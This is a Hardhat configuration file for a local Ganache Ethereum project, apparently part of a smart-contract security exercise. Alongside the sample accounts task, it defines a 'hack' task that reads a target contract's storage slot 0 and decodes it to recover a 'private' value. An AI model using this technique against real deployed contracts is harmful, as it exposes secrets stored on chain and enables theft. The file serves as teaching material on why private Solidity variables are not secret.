require("@nomiclabs/hardhat-waffle");

// This is a sample Hardhat task. To learn how to create your own go to
// https://hardhat.org/guides/create-task.html
task("accounts", "Prints the list of accounts", async (taskArgs, hre) => {
  const accounts = await hre.ethers.getSigners();

  for (const account of accounts) {
    console.log(account.address);
  }
});

const hex_to_ascii = _hex => {
  const hex = _hex.toString();
  let str = '';
  for (let i=0; i < hex.length; i+=2) {
    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  }
  return str;
}

task("hack", "get private value")
.addParam("target", "Target's contract address")
.setAction(async (taskArgs, hre) => {
  console.log("target contract address", taskArgs.target);

  const address = taskArgs.target;
  const provider = await hre.ethers.getDefaultProvider('http://localhost:8545');
  console.log('provider', provider);

  const storage = await provider.getStorageAt(address, 0);
  console.log('storage', storage);

  const result = hex_to_ascii(storage);
  console.log('result', result);
});

// You need to export an object to set up your config
// Go to https://hardhat.org/config/ to learn more

/**
 * @type import('hardhat/config').HardhatUserConfig
 */
module.exports = {
  defaultNetwork: "ganache",
  networks: {
    ganache: {
      url: "http://127.0.0.1:8545",
      // chainId: 5777
    },

  },
  solidity: "0.8.13",
};
